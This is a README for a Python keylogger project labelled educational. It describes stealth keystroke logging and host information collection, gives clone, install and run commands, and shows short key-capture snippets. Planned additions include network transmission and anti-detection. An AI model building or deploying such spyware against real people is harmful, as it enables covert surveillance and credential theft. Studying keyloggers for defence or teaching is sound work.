# Python Keylogger - Educational Project

**A Python-based keylogger implementation demonstrating keyboard monitoring and system information collection. For educational/research purposes only.**

## Features
- **Keystroke Logging**: Records all keyboard inputs with timestamps
- **System Information Collection**: Captures hostname, IP addresses, OS details, and processor info
- **Stealth Logging**: Runs in background with minimal visibility
- **Error Handling**: Robust exception handling for stable operation
- **Cross-Platform**: Works on Windows, Linux, and macOS

## Project Structure
- **Logging Configuration**: Customizable log format and storage
- **System Info Module**: Collects comprehensive device metadata
- **Key Press Handler**: Special key detection (Enter, Space, Backspace)
- **Listener Setup**: Non-blocking keyboard listener implementation

## How to Run

### Prerequisites
- Python 3.6+
- Administrative privileges (for some systems)

### Installation
1. Clone the repository:
```bash
git clone https://github.com/sabihhuda/Keylogger-Phyton.git
cd python-keylogger
Install dependencies:

bash
Copy
pip install pynput requests
Run the keylogger:

bash
Copy
python keylogger.py
Configuration
Modify LOG_DIRECTORY to change log file location

Adjust logging level in logging.basicConfig

Add/remove system information fields in collect_system_info()

Sample Code Snippets
1. System Information Collection
python
Copy
def collect_system_info():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    logging.info(f"OS: {platform.system()} {platform.version()}")
    logging.info(f"Processor: {platform.processor()}")
2. Key Press Handler
python
Copy
def on_key_press(key):
    if key == Key.space:
        logging.info(" ")
    elif key == Key.enter:
        logging.info("[ENTER]")
    else:
        logging.info(str(key).replace("'", ""))
Project Flow
Initialization: Setup logging configuration

System Snapshot: Collect hardware/network information

Listener Start: Begin monitoring keyboard input

Real-time Logging: Write keystrokes to log file

Clean Shutdown: Graceful termination on exit

Ethical Considerations
🔒 Legal Compliance: Always obtain explicit consent before monitoring

🛡️ Data Protection: Log files contain sensitive information - handle securely

⚠️ Responsible Use: Strictly for educational/authorized security research

Future Improvements
GUI interface for configuration

Log encryption implementation

Network transmission capabilities

Anti-detection mechanisms

Usage time limitations

License
This project is licensed under the MIT License - see LICENSE file for details

Contact
For educational inquiries: sabihhuda3@gmail.com
Note: This project is not maintained for actual usage - created purely for demonstration purposes.
